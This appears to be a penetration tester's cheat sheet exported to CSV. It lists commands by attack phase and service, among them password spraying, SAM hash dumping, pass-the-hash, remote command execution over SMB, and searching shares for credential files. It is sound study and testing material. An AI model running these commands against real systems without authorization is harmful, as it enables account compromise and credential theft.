Vector,Description,OS,Security Domains,Target_Technology,URL
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password,enforce password authentication,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
rdp-sec-check.pl <FQDN/IP>,Check the security settings of the RDP service.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),https://github.com/CiscoCXSecurity/rdp-sec-check
"xfreerdp /u:<user> /p:""<password>"" /v:<FQDN/IP>",rdp client,Linux,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
evil-winrm -i <FQDN/IP> -u <user> -p <password>,winrm client,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),winrm (https://www.notion.so/winrm-1444c8e52376805991b6e10d41025783?pvs=21),
./odat.py all -s <FQDN/IP>,oracle database enumeration,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),oracle (https://www.notion.so/oracle-1444c8e5237680789600f1b15e3fa0ec?pvs=21),
sqlplus <user>/<pass>@<FQDN/IP>/<db>,oracle database login,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),oracle (https://www.notion.so/oracle-1444c8e5237680789600f1b15e3fa0ec?pvs=21),
http://odat.py example,upload a file,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),oracle (https://www.notion.so/oracle-1444c8e5237680789600f1b15e3fa0ec?pvs=21),
http://crt.sh subdomain enumeration,Subdomain enumeration via crt.sh,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
rpcclient brute force example,Brute force users: rpcclient,"Impacket, Linux",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"rpc (https://www.notion.so/rpc-1444c8e5237680da82dbc974cd78a3f5?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)",https://github.com/fortra/impacket
Subdomain Brute Force Example,Brute force subdomains,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
rsync enumeration,enumerate rsync shares,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),rsync (https://www.notion.so/rsync-1444c8e5237680118c9cc462fa10b668?pvs=21),
smtp-user-enum -M RCPT -U userlist.txt -D mailserver.local -t 127.0.0.1,enumerate smtp users,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
imap commands,enumerate imap,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),imap (https://www.notion.so/imap-1444c8e5237680d0b8b8ceab811e309e?pvs=21),
pop3 commands,enumerate pop3,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),pop3 (https://www.notion.so/pop3-1444c8e523768094b845e25718ebd32c?pvs=21),
Hydra Brute Force FTP,brute force ftp,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
smbmap -H <FQDN/IP> - r <SHARE>,"Recursive network share enumeration ",Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
"smbmap -H <FQDN/IP> --download ""notes\note.txt""",Download file,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
"smbmap -H <FQDN/IP> --upload test.txt ""notes\test.txt""",Upload File,Linux,Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> -u /tmp/userlist.txt -p 'Company01!',password spray,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
impacket-psexec administrator:'Password123!'@<FQDN/IP>,Connect to SMB,"Impacket, Linux",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)",https://github.com/fortra/impacket
crackmapexec smb <FQDN/IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec,Crackmapexec Execute Command,Linux,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)",smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> -u administrator -p 'Password123!' --loggedon-users,Crackmapexec Enumerate logged on users,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> -u administrator -p 'Password123!' --sam,Crackmapexec Dump hashes,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE,Crackmapexec Pass the Hash,Linux,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30,Connect to MSSQL and specify min and max column widths of 30,Linux,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
sqsh -S <FQDN/IP> -U julio -P 'MyPassword!' -h,Connect to MSSQL,Linux,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
sqsh -S <FQDN/IP> -U .\\julio -P 'MyPassword!' -h,Connect to MSSQL with windows authentication,Linux,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
sqlcmd command examples,List of MSSQL Commands,Linux,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)",mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
mysql command examples,List of MySQL Commands,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21),
,,,,,
crowbar -b rdp -s <FQDN/IP/MASK> -U users.txt -c 'password123',Password spraying against the RDP service.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
Hydra Brute Force RDP,Brute Force RDP,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
rdesktop -u admin -p password123 <FQDN/IP>,Connect to RDP,Linux,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
RDP Pass the Hash (Disable Restricted Admin Mode),"Enable Restricted Admin Mode: Allow network logon instead of password based. ",Windows,"Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)",rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),https://www.blumira.com/blog/2024-apr-why-are-threat-actors-enabling-windows-restrictedadmin-mode
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA,xfreerdp Pass the Hash,Linux,"Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)",rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
subfinder -d paypal.com -v,Subdomain Enumeration,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
host -t MX microsoft.com,DNS lookup for mail servers,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),
"dig mx paypal.com | grep ""MX"" | grep -v "";""",DNS lookup for mail servers,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),
python3 o365spray.py --validate --domain msplaintext.xyz,Verify the usage of Office365 for the specified domain.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),https://github.com/0xZDH/o365spray
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz,Office 365 Password Spray,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),https://github.com/0xZDH/o365spray
Hydra Brute Force SSH,POP3 brute force,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),pop3 (https://www.notion.so/pop3-1444c8e523768094b845e25718ebd32c?pvs=21),
swaks open relay example,SMTP Open Relay Test,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),
net use n: \\192.168.220.129\Finance /user:plaintext Password123,Access Network Share,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
n:\*secret* /s /b,Search for file through all sub directories.,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),,
findstr /s /i cred n:\*.*,Find a string in multiple files.,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),,
Powershell Mount Network Drive,Mount Network Drive,Windows,"Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)","smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)",
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File,Search for files in directories.,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
"Get-ChildItem -Recurse -Path N:\ | Select-String ""cred"" -Lis",Powershell grep,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
